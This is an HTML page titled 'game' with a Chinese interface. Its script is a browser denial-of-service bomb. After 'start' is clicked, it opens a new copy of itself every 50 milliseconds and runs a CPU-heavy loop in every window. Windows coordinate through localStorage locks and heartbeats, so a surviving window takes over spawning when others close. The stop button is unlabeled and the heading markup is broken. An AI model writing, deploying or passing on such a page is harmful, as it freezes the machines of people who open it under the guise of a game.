<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="UTF-8">
    <title>game</title>
    <style>
        body {
            font-family: system-ui, sans-serif;
            text-align: center;
            padding: 40px;
            background: #111;
            color: #eee;
        }

        h1 {
            font-weight: 400;
            margin-bottom: 20px;
        }

        #count {
            font-size: 2.5rem;
            font-weight: bold;
            color: #0f0;
        }

        button {
            font-size: 1.2rem;
            padding: 12px 28px;
            margin: 10px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.15s;
        }

        #start {
            background: #0f0;
            color: #000;
        }

        #stop {
            background: #f33;
            color: #fff;
        }

        button:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        p.note {
            color: #aaa;
            margin-top: 24px;
            font-size: 0.9rem;
        }
    </style>
</head>

<body>
    <h1>/h1>
    <div> <span id="count">0</span> </div>
    <button id="start">▶ 开始</button>
    <button id="stop" disabled></button>
    <p class="note">点击“开始”</p>

    <script>
        const $ = id => document.getElementById(id);
        const countSpan = $('count');
        const startBtn = $('start');
        const stopBtn = $('stop');

        // ---- 全局键名 ----
        const RUN_KEY = 'infinite_running';
        const COUNT_KEY = 'infinite_count';
        const MASTER_ALIVE = 'master_alive';
        const MASTER_LOCK = 'master_lock';

        // ---- 配置参数 ----
        const LOOPS_PER_FRAME = 30000;   // 压力计算强度（每帧循环次数）
        const SPAWN_INTERVAL = 50;       // 裂变间隔（毫秒）

        // ---- 本窗口状态 ----
        let cpuTimer = null;              // 压力计算 RAF ID
        let masterTimer = null;           // 主调度器定时器 ID
        let isMaster = false;             // 是否为主调度器
        const myId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);

        // ---- 计数器操作 ----
        function updateCount() {
            countSpan.textContent = localStorage.getItem(COUNT_KEY) || '0';
        }
        function changeCount(delta) {
            let val = parseInt(localStorage.getItem(COUNT_KEY) || '0') + delta;
            if (val < 0) val = 0;
            localStorage.setItem(COUNT_KEY, val);
            updateCount();
        }

        // ---- 打开一个子窗口（仅由主调度器调用） ----
        function openChild() {
            const w = window.open(location.href, '_blank');
            if (w) {
                changeCount(1);
                const check = setInterval(() => {
                    if (w.closed) { clearInterval(check); changeCount(-1); }
                }, 800);
            }
        }

        // ---- 主调度器循环（递归setTimeout，避免setInterval堆积） ----
        function masterLoop() {
            if (!isMaster) return;
            openChild();
            masterTimer = setTimeout(masterLoop, SPAWN_INTERVAL);
        }

        // ---- 心跳更新（证明主调度器还活着） ----
        function heartbeat() {
            if (!isMaster) return;
            localStorage.setItem(MASTER_ALIVE, Date.now().toString());
        }

        // ---- 尝试成为主调度器 ----
        function tryBecomeMaster() {
            if (isMaster) return;
            // 通过锁竞争主调度器身份
            const now = Date.now();
            const lock = localStorage.getItem(MASTER_LOCK);
            if (!lock || now - parseInt(lock) > 1500) {
                // 设置锁，写入自己ID和时间
                localStorage.setItem(MASTER_LOCK, now + '_' + myId);
                // 稍等片刻再确认（防止并发）
                setTimeout(() => {
                    const currentLock = localStorage.getItem(MASTER_LOCK);
                    if (currentLock && currentLock.endsWith(myId)) {
                        becomeMaster();
                    }
                }, 50);
            }
        }

        function becomeMaster() {
            if (isMaster) return;
            isMaster = true;
            // 更新心跳
            localStorage.setItem(MASTER_ALIVE, Date.now().toString());
            // 启动主循环
            masterLoop();
            // 定时心跳
            setInterval(heartbeat, 500);
            // 检查其他主调度器是否还在，防止双主
            setInterval(() => {
                if (!isMaster) return;
                const alive = parseInt(localStorage.getItem(MASTER_ALIVE) || '0');
                if (Date.now() - alive > 2000) {
                    // 其他主调度器已死，重新确认本窗口身份
                    localStorage.setItem(MASTER_ALIVE, Date.now().toString());
                }
            }, 1000);
        }

        function releaseMaster() {
            if (!isMaster) return;
            isMaster = false;
            if (masterTimer) { clearTimeout(masterTimer); masterTimer = null; }
            localStorage.removeItem(MASTER_LOCK);
            localStorage.removeItem(MASTER_ALIVE);
        }

        // ---- 重度计算任务 ----
        function heavyLoad() {
            let r = 0.1;
            for (let i = 0; i < LOOPS_PER_FRAME; i++) {
                r += Math.sqrt(i) * Math.sin(i) * Math.cos(i);
                r *= 1.000001;
                if (i % 5000 === 0) r -= 0.000001;
            }
            return r;
        }

        function startCompute() {
            if (cpuTimer) return;
            function loop() {
                heavyLoad();
                cpuTimer = requestAnimationFrame(loop);
            }
            cpuTimer = requestAnimationFrame(loop);
        }

        function stopCompute() {
            if (cpuTimer) { cancelAnimationFrame(cpuTimer); cpuTimer = null; }
        }

        // ---- 全局启停 ----
        function start() {
            if (localStorage.getItem(RUN_KEY) === '1') return;
            localStorage.setItem(RUN_KEY, '1');
            startCompute();
            tryBecomeMaster();
            startBtn.disabled = true;
            stopBtn.disabled = false;
        }

        function stop() {
            localStorage.setItem(RUN_KEY, '0');
            stopCompute();
            releaseMaster();
            startBtn.disabled = false;
            stopBtn.disabled = true;
        }

        // ---- 页面初始化 ----
        window.addEventListener('load', () => {
            updateCount();
            // 只有被其他窗口打开的子窗口且全局运行中，才自动加入
            if (localStorage.getItem(RUN_KEY) === '1' && window.opener !== null) {
                startCompute();
                tryBecomeMaster();
                startBtn.disabled = true;
                stopBtn.disabled = false;
            }
            // 监听全局状态变化
            window.addEventListener('storage', e => {
                if (e.key === RUN_KEY) {
                    if (e.newValue === '1') {
                        startCompute();
                        tryBecomeMaster();
                        startBtn.disabled = true;
                        stopBtn.disabled = false;
                    } else {
                        stop();
                    }
                } else if (e.key === COUNT_KEY) {
                    updateCount();
                }
            });
            // 窗口关闭前清理
            window.addEventListener('beforeunload', () => {
                changeCount(-1);
                stopCompute();
                releaseMaster();
                if (parseInt(localStorage.getItem(COUNT_KEY) || '0') <= 0) {
                    localStorage.removeItem(RUN_KEY);
                    localStorage.removeItem(COUNT_KEY);
                }
            });
            // 主调度器竞争检查：定期检测是否需要接管
            setInterval(() => {
                if (localStorage.getItem(RUN_KEY) === '1' && !isMaster) {
                    const alive = parseInt(localStorage.getItem(MASTER_ALIVE) || '0');
                    if (Date.now() - alive > 1000) {
                        tryBecomeMaster();
                    }
                }
            }, 1000);
        });

        startBtn.onclick = start;
        stopBtn.onclick = stop;
    </script>
</body>

</html>
